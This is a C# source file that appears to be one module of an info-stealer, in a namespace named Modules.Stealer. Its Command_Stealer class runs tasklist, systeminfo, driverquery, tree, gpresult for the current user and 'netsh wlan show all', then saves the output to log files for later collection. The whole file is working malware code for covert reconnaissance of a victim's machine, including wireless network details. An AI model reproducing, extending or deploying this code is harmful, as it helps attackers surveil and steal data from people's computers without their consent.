using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Nullable.Modules.Stealer
{
    internal sealed class Command_Stealer
    {
        public static void Run()
        {
            string Tasklist = Modules.Manager.Command.Run("tasklist", false); //GPRESULT /USER targetusername /V
            string Systeminfo = Modules.Manager.Command.Run("SystemInfo", false);
            string DriverQuery = Modules.Manager.Command.Run("Driverquery", false);
            string Tree = Modules.Manager.Command.Run("Tree", false);
            string gpresult_R = Modules.Manager.Command.Run("gpresult /r", false);
            string gpresult_User_w = Modules.Manager.Command.Run("gpresult /user " + Environment.UserName + " /V", false);
            string netshwlanall = Modules.Manager.Command.Run("netsh wlan show all", false);

            File.AppendAllText(Config.LogPath + "\\(Cmd)TaskList.txt", Tasklist);
            File.AppendAllText(Config.LogPath + "\\(Cmd)SystemInfo.txt", Systeminfo);
            File.AppendAllText(Config.LogPath + "\\(Cmd)Tree.txt", Tree);
            File.AppendAllText(Config.LogPath + "\\(Cmd)gpresult_r.txt", gpresult_R);
            File.AppendAllText(Config.LogPath + "\\(Cmd)gpresult_User.txt", gpresult_User_w);
            File.AppendAllText(Config.LogPath + "\\(Cmd)netshWlanShowAll.txt", netshwlanall);
        }
        
    }
}
